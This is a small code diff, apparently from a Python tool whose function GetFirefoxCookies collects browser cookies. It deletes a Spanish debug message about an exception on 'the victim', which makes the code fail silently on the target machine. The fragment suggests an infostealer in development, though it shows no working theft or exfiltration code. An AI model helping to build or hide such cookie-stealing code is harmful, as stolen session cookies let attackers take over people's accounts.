@@ -32,7 +32,6 @@ def GetFirefoxCookies():
         return cookies
 
     except Exception:
-        print("Se ha lanzado una excepcion en la victima")
         return False;
 
 
